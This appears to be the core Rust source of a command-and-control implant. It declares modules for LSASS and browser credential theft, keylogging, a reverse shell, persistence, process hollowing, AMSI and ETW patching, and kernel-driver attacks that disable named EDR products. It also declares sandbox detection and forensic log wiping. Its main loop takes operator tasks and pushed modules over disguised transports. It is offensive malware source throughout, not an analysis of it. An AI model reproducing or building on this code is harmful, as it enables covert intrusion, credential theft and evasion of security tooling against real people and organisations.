pub mod config;
pub mod env_check;
pub mod fsops;
pub mod handlers;
pub mod process_manager;
pub mod process_spoof;
pub mod shell;

#[cfg(windows)]
pub mod token_manipulation;
#[cfg(windows)]
pub mod lateral_movement;

#[cfg(feature = "outbound-c")]
pub mod outbound;

#[cfg(feature = "ssh-transport")]
pub mod c2_ssh;

#[cfg(feature = "smb-pipe-transport")]
pub mod c2_smb;

#[cfg(feature = "persistence")]
pub mod persistence;

#[cfg(feature = "network-discovery")]
pub mod net_discovery;

#[cfg(feature = "remote-assist")]
pub mod remote_assist;

#[cfg(feature = "hci-research")]
pub mod hci_logging;

pub mod syscalls;

// Unwind-aware call-stack spoofing database and chain generator.
// Provides multi-frame plausible call graph chains for the NtContinue-based
// stack-spoof path in syscalls.rs.  Gated behind `stack-spoof` + x86_64.
#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
pub mod stack_db;

// Self-re-encoding ("Metamorphic Lite"): re-encode .text at runtime.
#[cfg(feature = "self-reencode")]
pub mod self_reencode;

// Memory-guard: active implementation when feature is on, zero-cost stubs when off.
#[cfg(feature = "memory-guard")]
pub mod memory_guard;
#[cfg(not(feature = "memory-guard"))]
#[path = "memory_guard_stub.rs"]
pub mod memory_guard;

pub mod p2p;

// Unified injection framework (Windows-only, wraps existing injection module).
#[cfg(windows)]
pub mod injection_engine;

// NTDLL unhooking via \KnownDlls re-fetch. Supplements Halo's Gate by
// re-fetching a clean ntdll .text section when all adjacent syscall stubs
// are hooked. Used as fallback when Halo's Gate cannot infer an SSN,
// as a post-sleep-wake re-check, and on operator command.
#[cfg(windows)]
pub mod ntdll_unhook;

// Advanced sleep obfuscation with full memory encryption, stack spoofing,
// and anti-forensics.  Replaces the Ekko-style sleep on Windows.
#[cfg(windows)]
pub mod sleep_obfuscation;

// Continuous memory hiding ("Evanesco"): keeps all pages NOT actively being
// executed in an encrypted/PAGE_NOACCESS state at ALL times.  Per-page RC4
// encryption, VEH-based auto-decryption, and background re-encryption.
// Windows-only, gated by the `evanesco` feature flag.
#[cfg(all(windows, feature = "evanesco"))]
pub mod page_tracker;

// Continuous memory hygiene: PEB scrubbing, thread start address sanitization,
// handle table cleanup, and periodic re-verification.  Works alongside the
// sleep obfuscation system to reduce forensic visibility.
#[cfg(windows)]
pub mod memory_hygiene;

// In-process .NET assembly execution via CLR hosting (ICLRMetaHost).
// Equivalent to Cobalt Strike's execute-assembly.  Loads and runs arbitrary
// .NET assemblies entirely in-process without spawning a child process.
#[cfg(windows)]
pub mod assembly_loader;

// BOF (Beacon Object File) / COFF loader — executes small position-
// independent C/Rust object files in-process.  Compatible with the public
// BOF ecosystem (trustedsec, CCob, naaf, etc.) via the DLL$Function symbol
// resolution scheme.
#[cfg(windows)]
pub mod coff_loader;

// Interactive reverse shell — persistent cmd.exe / sh / custom shell process
// where the operator can type commands and receive real-time output.
// Background reader threads stream output asynchronously through the C2
// channel as Message::ShellOutput events.
pub mod interactive_shell;

// Malleable C2 profile parser — defines how the agent shapes its C2 traffic
// (HTTP/DNS) to blend in with legitimate network activity.  Platform-agnostic.
pub mod malleable;

// Surveillance capabilities: screenshot capture, keylogger, clipboard monitor.
// Gated by the `surveillance` feature flag.
#[cfg(feature = "surveillance")]
pub mod surveillance;

// Browser stored-data recovery: Chrome (App-Bound Encryption v127+), Edge,
// Firefox (NSS-based decryption).  Windows-only, gated by `browser-data`.
#[cfg(all(windows, feature = "browser-data"))]
pub mod browser_data;

// LSASS credential harvesting: incremental memory reading via indirect syscalls.
// Parses credential structures in-process without creating a dump file on disk.
// Windows-only.
#[cfg(windows)]
pub mod lsass_harvest;

// LSA Whisperer: credential extraction via LSA SSP interfaces.
// Interacts with LSA authentication packages through documented interfaces,
// operating within the LSA process's own security context.  Bypasses Credential
// Guard and RunAsPPL.  Windows-only, gated by `lsa-whisperer`.
#[cfg(all(windows, feature = "lsa-whisperer"))]
pub mod lsa_whisperer;

// Kernel callback overwrite (BYOVD): surgically overwrite EDR kernel callback
// function pointers to point to a `ret` instruction instead of NULLing them.
// Defeats EDR self-integrity checks (CrowdStrike, Defender) that verify their
// callbacks are still registered by checking if the pointer is non-NULL.
// Uses a vulnerable signed driver for physical memory read/write access.
// Windows-only, gated by `kernel-callback` (implies `direct-syscalls`).
#[cfg(all(windows, feature = "kernel-callback"))]
pub mod kernel_callback;

// Automated EDR bypass transformation engine: scans the agent's own .text
// section for byte signatures known to be detected by EDR (YARA rules, entropy
// heuristics, known gadget chains like "4C 8B D1 B8" for direct syscall stubs).
// When a detected pattern is found, applies semantic-preserving transformations
// at runtime: instruction substitution, register reassignment, nop sled
// insertion, constant splitting, jump obfuscation.  Supplements self-reencode
// (handles pattern avoidance before and after morphing).  Gated by
// `evasion-transform` (implies `self-reencode`).
#[cfg(feature = "evasion-transform")]
pub mod edr_bypass_transform;

// NTFS transaction-based process hollowing with ETW blinding: creates an
// NTFS transaction, writes payload into a transaction-backed section,
// creates the target process suspended, hollows it, then rolls back the
// transaction so the file on disk never existed.  The section mapping in
// the target process remains valid.  Includes ETW blinding with spoofed
// Windows Defender / Sysmon provider GUIDs.  SSN resolution via existing
// indirect syscall infrastructure with kernel32 ordinal fallback.
// Windows-only, gated by `transacted-hollowing` feature flag.
#[cfg(all(windows, feature = "transacted-hollowing"))]
pub mod injection_transacted;

// Delayed module-stomp injection: loads a sacrificial DLL into the target
// process via LoadLibraryA, waits for a configurable randomized delay
// (default 8–15 seconds) to let EDR initial-scan heuristics pass, then
// overwrites the DLL's .text section with the payload using indirect
// syscalls.  Two-phase: Phase 1 loads DLL and returns immediately;
// Phase 2 (stomp + execute) fires after the delay in a background thread.
// Payload state is stored encrypted via memory_guard.  Windows-only,
// gated by `delayed-stomp` feature flag.
#[cfg(all(windows, feature = "delayed-stomp"))]
pub mod injection_delayed_stomp;

// User-mode NT kernel interface emulation: routes configured Nt* syscalls
// through kernel32/advapi32 equivalents instead of ntdll syscall stubs.
// Makes the agent invisible to EDR hooks on ntdll AND to ntdll unhooking
// detection.  Call stacks show kernel32!WriteProcessMemory etc. — looks
// like legitimate API usage.  Falls back to existing indirect syscall path
// when kernel32 equivalent fails.  Windows-only, gated by `syscall-emulation`
// feature flag (implies `direct-syscalls`).
#[cfg(all(windows, feature = "syscall-emulation"))]
pub mod syscall_emulation;

// CET (Control-flow Enforcement Technology) / Shadow Stack bypass: handles
// Windows 11 24H2+ hardware-enforced shadow stacks that defeat return-address
// spoofing and stack pivoting.  Three strategies: (1) disable CET via process
// mitigation policy, (2) CET-compatible call chain building, (3) VEH-based
// shadow stack fix (experimental, requires kernel access via kernel-callback).
// Integrates with the existing stack-spoofing code in syscalls.rs by adding
// a CET-awareness check at the entry point of spoof_call.  Windows-only,
// gated by `cet-bypass` feature flag (implies `direct-syscalls`).
#[cfg(all(windows, feature = "cet-bypass"))]
pub mod cet_bypass;

// Token-only impersonation via NtImpersonateThread / SetThreadToken:
// bypasses ImpersonateNamedPipeClient detection by extracting the
// impersonation token through a helper thread and applying it to the
// main thread via NtSetInformationThread(ThreadImpersonationToken).
// Alternative strategy uses DuplicateTokenEx + SetThreadToken directly.
// Includes encrypted token cache, auto-revert on task completion, and
// integration with lsass_harvest and P2P SMB pipe connections.
// Windows-only, gated by `token-impersonation` feature flag
// (implies `direct-syscalls`).
#[cfg(all(windows, feature = "token-impersonation"))]
pub mod token_impersonation;

// Forensic cleanup subsystem: removes forensic evidence left by injected
// processes.  Currently provides Windows Prefetch (.pf) evidence removal
// via three strategies: delete (NtDeleteFile), patch (NtCreateSection +
// NtMapViewOfSection — preferred, file remains but contains no forensic
// data), and disable-service (registry EnablePrefetcher = 0).  Also
// cleans USN journal entries referencing the .pf file.  All NT API calls
// use indirect syscalls via nt_syscall to bypass EDR hooks.
// Hooks into injection_engine post-injection for automatic cleanup.
// Handles DISK evidence only — does NOT overlap with any memory-hygiene
// subsystem.
// Windows-only, gated by `forensic-cleanup` feature flag
// (implies `direct-syscalls`).
#[cfg(all(windows, feature = "forensic-cleanup"))]
pub mod forensic_cleanup;

use anyhow::Result;
use common::{CryptoSession, Message, Transport};
use log::{error, info, warn};
use std::sync::Arc;
use tokio::sync::{Mutex, RwLock};

/// Outbound messages are sent through an mpsc channel to a dedicated writer
/// task that holds the transport lock.  This prevents the deadlock that occurs
/// when the main loop holds the transport Mutex during `recv()` while a
/// spawned command handler tries to acquire the same lock to send a response.
const OUTBOUND_CHANNEL_CAPACITY: usize = 256;

/// Generate a short alphanumeric identifier (8 chars) suitable for
/// transient resource naming (e.g. temporary service names, file names).
pub fn common_short_id() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:08x}", (ts as u32) ^ ((ts >> 32) as u32))
}

pub struct Agent {
    transport: Arc<Mutex<Box<dyn Transport + Send>>>,
    config: config::ConfigHandle,
    /// AES-256-GCM session used to decrypt capability modules deployed at
    /// runtime. Derived from the `module_aes_key` in `agent.toml`, or
    /// a zero key when not configured (development only).
    crypto: Arc<CryptoSession>,
    /// P2P mesh state. Populated when the agent accepts child connections
    /// (via SMB named-pipe listener or TCP P2P relay). An empty/default
    /// mesh means the agent has no children.
    p2p_mesh: Arc<tokio::sync::Mutex<p2p::P2pMesh>>,
}

impl Agent {
    pub fn new(transport: Box<dyn Transport + Send>) -> Result<Self> {
        // Evasion patches are applied once in Agent::run() before the main loop.
        // Applying them here as well would create a race: if the memory patch
        // takes effect here but is reverted by EDR before run() installs the
        // hardware-breakpoint layer, neither layer would be active.  A single
        // ordered application in run() is safer.

        let cfg = config::load_config()?;

        // Enforce kill date from malleable profile at agent startup (4-2).
        // Uses config::check_kill_date which is transport-independent so that
        // kill-date enforcement works regardless of which transport features
        // are compiled in.
        if !cfg.malleable_profile.kill_date.is_empty() {
            crate::config::check_kill_date(&cfg.malleable_profile.kill_date)?;
        }

        // Derive the module-decryption key from configuration.
        // In production this key must be set in agent.toml.
        let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_aes_key {
            use base64::Engine;
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(b64)
                .map_err(|e| {
                    anyhow::anyhow!(
                        "module_aes_key in agent.toml is not valid base64: {}. \
                     Provide a valid 32-byte base64-encoded key or remove the field \
                     to disable module signature verification.",
                        e
                    )
                })?;
            if bytes.len() != 32 {
                return Err(anyhow::anyhow!(
                    "module_aes_key must decode to exactly 32 bytes, got {} byte(s). \
                     Re-generate the key with the `keygen` tool.",
                    bytes.len()
                ));
            }
            let mut key = [0u8; 32];
            key.copy_from_slice(&bytes);
            key
        } else {
            // In release builds (no debug_assertions, not dev/test feature) a
            // missing module_aes_key is a hard error: an all-zero key lets
            // anyone push arbitrary modules.  Development builds accept the
            // insecure default so the build cycle stays fast.
            #[cfg(not(any(debug_assertions, feature = "dev", test)))]
            return Err(anyhow::anyhow!(
                "module_aes_key is required in production builds. \
                 Generate a 32-byte key with `keygen`, base64-encode it, \
                 and set it in agent.toml under [module_aes_key]."
            ));

            #[cfg(any(debug_assertions, feature = "dev", test))]
            log::warn!(
                "WARNING: module_aes_key not set — using insecure all-zero key. \
                 Do not use in production!"
            );

            [0u8; 32] // insecure default; acceptable only for development builds
        };

        let crypto = Arc::new(CryptoSession::from_key(crypto_key));
        crate::memory_guard::register_session_key(&crypto);
        Ok(Self {
            transport: Arc::new(Mutex::new(transport)),
            config: Arc::new(RwLock::new(cfg)),
            crypto,
            p2p_mesh: Arc::new(tokio::sync::Mutex::new(p2p::P2pMesh::default())),
        })
    }

    pub async fn run(&mut self) -> Result<()> {
        // Trusted Execution Environment Enforcement runs FIRST, before any
        // side-effectful hooks are applied.  If the environment is hostile
        // (debugger, wrong domain, VM when refuse_in_vm is set) the agent
        // enters a dormant state without having modified any process state.
        #[cfg(feature = "env-validation")]
        {
            let decision = {
                let cfg = self.config.read().await;
                env_check::enforce(
                    cfg.required_domain.as_deref(),
                    cfg.refuse_when_debugged,
                    cfg.refuse_in_vm,
                    cfg.sandbox_score_threshold,
                )
            };

            if decision.report.ld_preload_set {
                log::warn!("LD_PRELOAD is set in the environment (soft warning)");
            }
            if decision.report.timing_anomaly_detected {
                log::warn!("Timing anomaly detected (soft warning, possibly high load)");
            }

            if decision.refuse {
                error!(
                    "environment validation failed (debugger={}, vm={}, domain_match={:?}); agent entering dormant state",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
                const RECHECK_INTERVAL_SECS: u64 = 2 * 3600;
                const MAX_RETRIES: u32 = 3;
                let mut retries = 0u32;
                loop {
                    if let Err(e) = crate::memory_guard::guarded_sleep(
                        std::time::Duration::from_secs(RECHECK_INTERVAL_SECS),
                        None,
                        0, // no key rotation during dormant sleep
                    )
                    .await
                    {
                        error!("[memory-guard] error during dormant sleep: {e}");
                    }
                    let recheck = {
                        let cfg = self.config.read().await;
                        env_check::enforce(
                            cfg.required_domain.as_deref(),
                            cfg.refuse_when_debugged,
                            cfg.refuse_in_vm,
                            cfg.sandbox_score_threshold,
                        )
                    };
                    if !recheck.refuse {
                        info!("environment re-check passed; resuming normal operation");
                        break;
                    }
                    retries += 1;
                    if retries >= MAX_RETRIES {
                        error!("maximum dormant retries ({}) reached; returning error so reconnect loop retries", MAX_RETRIES);
                        return Err(anyhow::anyhow!(
                            "Environment check failed permanently after {} retries",
                            MAX_RETRIES
                        ));
                    }
                    error!(
                        "environment re-check failed ({}/{}); remaining dormant",
                        retries, MAX_RETRIES
                    );
                }
            } else {
                info!(
                    "environment validation passed (debugger={}, vm={}, domain_match={:?})",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
            }
        }

        // Evasion layers are applied AFTER environment validation succeeds.
        // Applying them before validation would produce side-effects (AMSI
        // patches, thread hiding) even on hostile hosts where the agent should
        // refuse to run.

        // Evanesco VEH registration must happen BEFORE any AMSI/ETW bypass
        // activation so that the Evanesco VEH handler is lower in the chain
        // (higher priority) and does not interfere with the AMSI HWBP VEH.
        #[cfg(all(windows, feature = "evanesco"))]
        {
            let cfg = self.config.read().await;
            let evanesco_cfg = &cfg.evanesco;
            if let Err(e) = crate::page_tracker::init(
                evanesco_cfg.idle_threshold_ms,
                evanesco_cfg.scan_interval_ms,
            ) {
                log::warn!("evanesco: init failed (non-fatal): {e:#}");
            }
        }

        // Initialise user-mode NT kernel interface emulation.  This MUST
        // happen before any injection or memory operations that would
        // otherwise go through ntdll syscall stubs.  The emulation layer
        // routes configured Nt* calls through kernel32/advapi32 equivalents,
        // making the agent invisible to EDR hooks on ntdll.
        #[cfg(all(windows, feature = "syscall-emulation"))]
        {
            let cfg = self.config.read().await;
            crate::syscall_emulation::init_from_config(&cfg.syscall_emulation);
            log::info!(
                "syscall_emulation: initialised (enabled={}, prefer_kernel32={}, emulated={:?})",
                cfg.syscall_emulation.enabled,
                cfg.syscall_emulation.prefer_kernel32,
                cfg.syscall_emulation.emulated_functions,
            );
        }

        // Initialise CET / shadow-stack bypass.  This MUST happen before any
        // injection or stack-spoofing operations that manipulate return
        // addresses.  Detects the current CET state and configures the
        // appropriate bypass strategy (policy disable, call chain, or VEH).
        #[cfg(all(windows, feature = "cet-bypass"))]
        {
            let cfg = self.config.read().await;
            crate::cet_bypass::init_from_config(&cfg.cet_bypass);
            log::info!(
                "cet_bypass: initialised (enabled={}, state={})",
                cfg.cet_bypass.enabled,
                crate::cet_bypass::cet_state(),
            );
        }

        // Token-only impersonation: avoids ImpersonateNamedPipeClient
        // on the main agent thread, which is heavily signatured by EDR.
        // Uses NtImpersonateThread or SetThreadToken to apply extracted
        // tokens instead.  Includes encrypted token cache and auto-revert.
        #[cfg(all(windows, feature = "token-impersonation"))]
        {
            let cfg = self.config.read().await;
            crate::token_impersonation::init_from_config(&cfg.token_impersonation);
        }

        // Initialise the forensic cleanup subsystem.  Loads config for
        // Prefetch evidence removal (cleanup method, auto-clean after
        // injection, USN journal cleanup, etc.).  All NT API calls use
        // indirect syscalls to bypass EDR hooks.
        #[cfg(all(windows, feature = "forensic-cleanup"))]
        {
            let cfg = self.config.read().await;
            crate::forensic_cleanup::prefetch::init_from_config(&cfg.prefetch);
            crate::forensic_cleanup::timestamps::init_from_config(&cfg.timestamps);
        }

        #[cfg(feature = "stealth")]
        {
            log::debug!("Applying evasion layers");
            // AMSI bypass: choose HWBP OR memory patch, never both (H-11).
            // The memory patch overwrites the bytes that HWBP set breakpoints on,
            // so running both makes the HWBP path silently no-op.
            //
            // Strategy is selected at compile time via the `hwbp-amsi` feature:
            //   - Default (no feature): memory-patch approach (no env-var trace).
            //   - hwbp-amsi feature:     hardware-breakpoint VEH approach.
            // The old ORCHESTRA_AMSI_HWBP env-var check was a host-based IOC
            // and has been removed.
            #[cfg(feature = "hwbp-amsi")]
            {
                unsafe {
                    crate::evasion::patch_amsi();
                }
            }
            #[cfg(not(feature = "hwbp-amsi"))]
            {
                crate::amsi_defense::orchestrate_layers();
            }
            crate::amsi_defense::verify_bypass();
            crate::evasion::hide_current_thread();
            log::debug!("Evasion layers applied");
        }

        // Startup transport selection is feature-gated and profile-driven.
        // Effective priority matches outbound startup selection:
        // SSH > DoH > HTTP > TLS fallback.
        //
        // `outbound::build_outbound_transport` performs the concrete transport
        // construction; this block documents and validates the same runtime
        // decisions from the active malleable profile.
        {
            let cfg = self.config.read().await;
            let profile = &cfg.malleable_profile;

            #[cfg(feature = "ssh-transport")]
            let ssh_selected = profile
                .ssh_host
                .as_deref()
                .filter(|s| !s.is_empty())
                .is_some();
            #[cfg(not(feature = "ssh-transport"))]
            let ssh_selected = false;

            #[cfg(feature = "doh-transport")]
            let doh_selected = !ssh_selected && profile.dns_over_https;
            #[cfg(not(feature = "doh-transport"))]
            let doh_selected = false;

            #[cfg(feature = "http-transport")]
            let http_selected = !ssh_selected && !doh_selected && profile.cdn_relay;
            #[cfg(not(feature = "http-transport"))]
            let http_selected = false;

            if ssh_selected {
                info!("startup transport profile preference: SSH (priority=1)");
            } else if doh_selected {
                info!("startup transport profile preference: DoH (priority=2)");
            } else if http_selected {
                info!("startup transport profile preference: HTTP (priority=3)");
            } else {
                info!("startup transport profile preference: TLS (priority=4 fallback)");
            }

            #[cfg(not(feature = "ssh-transport"))]
            if profile
                .ssh_host
                .as_deref()
                .filter(|s| !s.is_empty())
                .is_some()
            {
                log::warn!(
                    "ssh_host is configured in the malleable profile but the `ssh-transport` \
                     feature is not compiled in. SSH branch is skipped."
                );
            }

            #[cfg(not(feature = "doh-transport"))]
            if profile.dns_over_https {
                log::warn!(
                    "dns_over_https=true in config but the `doh-transport` feature is not \
                     compiled in. DoH branch is skipped in startup transport selection. \
                     Rebuild with --features doh-transport to enable DohTransport. \
                     NOTE: a server-side DoH listener is required and is not included \
                     in this release."
                );
            }
            #[cfg(not(feature = "http-transport"))]
            if profile.cdn_relay {
                log::warn!(
                    "cdn_relay=true in config but the `http-transport` feature is not \
                     compiled in. HTTP branch is skipped in startup transport selection. \
                     Rebuild with --features http-transport to enable HttpTransport."
                );
            }
        }

        #[cfg(feature = "hot-reload")]
        {
            let handle = self.config.clone();
            if let Ok(Some(_watcher)) = config::spawn_config_watcher(handle) {
                info!("Hot-reload config watcher started");
            }
        }

        // Optimise hot functions at startup
        #[cfg(feature = "unsafe-runtime-rewrite")]
        if let Err(e) = optimizer::optimize_hot_function("crypto_session_encrypt") {
            tracing::warn!("Runtime optimization failed: {}", e);
        }

        // Honour opt-in persistence (Prompt H).
        #[cfg(feature = "persistence")]
        {
            let cfg = self.config.read().await;
            if cfg.persistence_enabled {
                match persistence::install_persistence() {
                    Ok(p) => info!("Persistence installed at {}", p.display()),
                    Err(e) => error!("Failed to install persistence: {e}"),
                }
            }
        }

        info!("Agent started, waiting for commands...");
        let mut tasks = tokio::task::JoinSet::new();

        // Spawn the periodic self-re-encoding background task.  Derive a
        // non-zero default seed from the session key so the feature is active
        // from the first cycle.  The seed will be updated when the server
        // sends `SetReencodeSeed`.
        #[cfg(feature = "self-reencode")]
        {
            let interval = {
                let cfg = self.config.read().await;
                cfg.reencode_interval_secs
            };
            let default_seed =
                crate::self_reencode::derive_default_seed(self.crypto.key_bytes());
            let shutdown = crate::handlers::SHUTDOWN_NOTIFY.clone();
            tasks.spawn(async move {
                let _ = crate::self_reencode::spawn_periodic_reencode(
                    default_seed,
                    std::time::Duration::from_secs(interval),
                    shutdown,
                )
                .await;
            });
            info!("self-reencode background task spawned (interval={interval}s, seed=auto-derived)");
        }

        // Outbound message channel: spawned command handlers push responses
        // here instead of locking the transport directly.  The main loop
        // drains the channel alongside recv(), preventing the deadlock that
        // occurs when the recv()-side holds the Mutex while a spawned task
        // waits for the same lock to send a response.
        let (outbound_tx, mut outbound_rx) =
            tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);

        // Spawn the P2P heartbeat and dead-link detection background task.
        // This is a no-op when the mesh has no links; it sends heartbeats
        // to connected links and detects dead ones.
        #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
        {
            let mesh = self.p2p_mesh.clone();
            let out_tx = outbound_tx.clone();
            let _hb_handle = p2p::spawn_heartbeat_task(
                mesh,
                out_tx,
                std::time::Duration::from_secs(30),
            );
            info!("P2P heartbeat background task spawned (interval=30s)");
        }

        // Internal channel for P2P parent-link C2 messages.  The parent
        // reader task (spawned when a parent link is established) sends
        // decrypted Messages through this channel.  The main loop reads
        // them alongside the C2 transport.
        //
        // Always created so the select! branch compiles unconditionally;
        // when no P2P transport feature is enabled the sender is never
        // stored in the mesh and the channel stays empty.
        let (p2p_inbound_tx, mut p2p_inbound_rx) =
            tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);

        // Wire the inbound sender into the mesh so `connect_to_parent`
        // can pass it to `spawn_parent_reader`.
        #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
        {
            let mut mesh = self.p2p_mesh.lock().await;
            mesh.inbound_tx = Some(p2p_inbound_tx);
        }

        // Iteration counter for periodic tasks (syscall cache validation, etc.).
        let mut loop_iteration: u32 = 0;

        loop {
            loop_iteration += 1;

            // Periodic syscall SSN cache validation.  Cross-references the
            // ntdll PE timestamp and probes critical syscalls to detect
            // stale entries (e.g. after a silent Windows Update).
            #[cfg(all(windows, feature = "direct-syscalls"))]
            {
                let interval = self.config.read().await.syscall.validate_interval;
                if interval > 0 && loop_iteration % interval == 0 {
                    match crate::syscalls::validate_cache() {
                        Ok(n) => {
                            log::debug!("Periodic syscall cache validation: {} entries OK", n);
                        }
                        Err(e) => {
                            log::warn!("Periodic syscall cache validation failed: {e}; cache invalidated, will re-map on next syscall");
                        }
                    }
                }
            }

            // Drain any pending outbound messages before we block on recv().
            // This ensures responses from the previous iteration are flushed
            // before we re-acquire the lock to wait for the next command.
            {
                let mut transport = self.transport.lock().await;
                while let Ok(msg) = outbound_rx.try_recv() {
                    if let Err(e) = transport.send(msg).await {
                        error!("Failed to send outbound message: {}", e);
                    }
                }
            }

            let msg_fut = async {
                let mut transport = self.transport.lock().await;
                transport.recv().await
            };

            let msg = tokio::select! {
                res = msg_fut => res,
                // Also check for outbound messages while waiting for inbound.
                // This handles the race where a response is produced just
                // before we re-acquire the lock for recv().
                outbound = outbound_rx.recv() => {
                    if let Some(msg) = outbound {
                        let mut transport = self.transport.lock().await;
                        if let Err(e) = transport.send(msg).await {
                            error!("Failed to send outbound message: {}", e);
                        }
                    }
                    continue;
                }
                // P2P parent-link messages: decrypted C2 data from the
                // parent agent, injected via `spawn_parent_reader`.
                p2p_msg = p2p_inbound_rx.recv() => {
                    match p2p_msg {
                        Some(msg) => Ok(msg),
                        None => {
                            warn!("P2P inbound channel closed");
                            continue;
                        }
                    }
                }
                _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                    info!("Shutdown signal received, draining tasks and shutting down.");
                    #[cfg(all(windows, feature = "evanesco"))]
                    crate::page_tracker::shutdown();
                    #[cfg(all(windows, feature = "stealth"))]
                    crate::amsi_defense::cleanup_com_hijack();
                    break;
                }
            };

            match msg {
                Ok(Message::TaskRequest {
                    task_id,
                    command,
                    operator_id,
                }) => {
                    info!("Received command: {:?}", command);
                    let crypto = self.crypto.clone();
                    let config_handle = self.config.clone();
                    let command_for_sync = command.clone();
                    let out_tx = outbound_tx.clone();
                    let p2p_mesh = self.p2p_mesh.clone();
                    tasks.spawn(async move {
                        let config = Arc::new(Mutex::new(config_handle.read().await.clone()));
                        let (response, result_data, audit_event) = handlers::handle_command(
                            crypto,
                            config.clone(),
                            command,
                            operator_id.as_deref().unwrap_or("admin"),
                            out_tx.clone(),
                            p2p_mesh,
                        )
                        .await;

                        if matches!(command_for_sync, common::Command::ReloadConfig)
                            && response.is_ok()
                        {
                            let updated_cfg = config.lock().await.clone();
                            let mut live_cfg = config_handle.write().await;
                            *live_cfg = updated_cfg;
                        }

                        if let Err(e) = out_tx.send(Message::AuditLog(audit_event)).await {
                            warn!("Outbound channel closed, dropping audit log: {}", e);
                        }
                        if let Err(e) = out_tx
                            .send(Message::TaskResponse {
                                task_id,
                                result: response,
                                result_data,
                            })
                            .await
                        {
                            warn!("Outbound channel closed, dropping response: {}", e);
                        }
                    });
                }
                Ok(Message::Shutdown) => {
                    info!("Shutdown received, exiting.");
                    #[cfg(all(windows, feature = "evanesco"))]
                    crate::page_tracker::shutdown();
                    #[cfg(all(windows, feature = "stealth"))]
                    crate::amsi_defense::cleanup_com_hijack();
                    break;
                }
                Ok(Message::ModulePush {
                    module_name,
                    version,
                    encrypted_blob,
                }) => {
                    info!(
                        "ModulePush received: module='{}' version='{}'",
                        module_name, version
                    );
                    let crypto = self.crypto.clone();
                    let out_tx = outbound_tx.clone();
                    let name_clone = module_name.clone();
                    let ver_clone = version.clone();
                    let verify_key = self.config.read().await.module_verify_key.clone();
                    tasks.spawn(async move {
                        let result =
                            handlers::push_module(name_clone.clone(), &encrypted_blob, &crypto, verify_key.as_deref());
                        let (outcome, details) = match &result {
                            Ok(s) => {
                                info!("ModulePush '{}': {}", name_clone, s);
                                (common::Outcome::Success, s.as_str().to_owned())
                            }
                            Err(e) => {
                                error!("ModulePush '{}' failed: {}", name_clone, e);
                                (common::Outcome::Failure, e.as_str().to_owned())
                            }
                        };
                        let action =
                            format!("ModulePush(module={name_clone:?},version={ver_clone:?})");
                        let audit = handlers::make_audit(&action, outcome, &details, "server");
                        if let Err(e) = out_tx.send(Message::AuditLog(audit)).await {
                            warn!("Outbound channel closed, dropping ModulePush audit: {}", e);
                        }
                    });
                }
                Ok(Message::ModuleResponse {
                    module_id,
                    encrypted_blob,
                }) => {
                    // Complete the pending oneshot so the DownloadModule
                    // handler can proceed with loading the module.
                    if let Some(sender) =
                        handlers::PENDING_MODULE_REQUESTS.lock().unwrap().remove(&module_id)
                    {
                        let _ = sender.send(encrypted_blob);
                    } else {
                        warn!("Received ModuleResponse for unknown module_id '{}'", module_id);
                    }
                }
                Ok(Message::P2pToChild { child_link_id, data }) => {
                    // Server → child: re-encrypt with child's per-link key
                    // and send as DataForward P2P frame.
                    #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
                    {
                        info!(
                            "P2pToChild received: forwarding {} bytes to child link {:#010X}",
                            data.len(),
                            child_link_id
                        );
                        let mesh_arc = self.p2p_mesh.clone();
                        let mut mesh = mesh_arc.lock().await;
                        match p2p::forward_to_child(&mut mesh, child_link_id, &data).await {
                            Ok(()) => {
                                log::debug!(
                                    "P2P data forwarded to child {:#010X} ({} bytes)",
                                    child_link_id,
                                    data.len()
                                );
                            }
                            Err(e) => {
                                error!(
                                    "P2P forward_to_child failed for link {:#010X}: {}",
                                    child_link_id, e
                                );
                            }
                        }
                    }
                    #[cfg(not(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp")))]
                    {
                        let _ = (child_link_id, data);
                        warn!("P2pToChild received but no P2P transport feature enabled");
                    }
                }
                Ok(Message::MeshCertificateIssuance { certificate }) => {
                    info!("MeshCertificateIssuance received — storing mesh certificate");
                    let mut mesh_guard = self.p2p_mesh.lock().await;
                    mesh_guard.store_mesh_certificate(certificate);
                }
                Ok(Message::MeshCertificateRevocation { revoked_agent_id_hash }) => {
                    info!(
                        "MeshCertificateRevocation received — revoking agent hash {:?}",
                        revoked_agent_id_hash
                    );
                    let mut mesh_guard = self.p2p_mesh.lock().await;
                    let terminated = mesh_guard.handle_certificate_revocation(revoked_agent_id_hash);
                    if !terminated.is_empty() {
                        info!(
                            "certificate revocation terminated {} link(s)",
                            terminated.len()
                        );
                    }
                }
                Ok(Message::MeshCertificateRenewal) => {
                    info!("MeshCertificateRenewal received — requesting cert renewal");
                    // Request a new certificate from the server via outbound.
                    let out_tx = outbound_tx.clone();
                    let _ = out_tx.send(Message::MeshCertificateRenewal).await;
                }
                Ok(Message::MeshQuarantineReport {
                    quarantined_agent_id_hash,
                    reason,
                    evidence_hash,
                }) => {
                    info!(
                        "MeshQuarantineReport: agent hash {:?} reason={} — forwarding upstream",
                        quarantined_agent_id_hash, reason
                    );
                    let out_tx = outbound_tx.clone();
                    let _ = out_tx
                        .send(Message::MeshQuarantineReport {
                            quarantined_agent_id_hash,
                            reason,
                            evidence_hash,
                        })
                        .await;
                }
                Ok(_) => {} // ignore heartbeats etc.
                Err(e) => {
                    error!("Transport error: {}", e);
                    // Drain tasks before returning error
                    while tasks.join_next().await.is_some() {}
                    return Err(e);
                }
            }
        }

        while tasks.join_next().await.is_some() {}
        Ok(())
    }
}

pub mod amsi_defense;
#[cfg(windows)]
pub mod callback_exec;
pub mod etw_patch;
pub mod evasion;
pub mod stub;

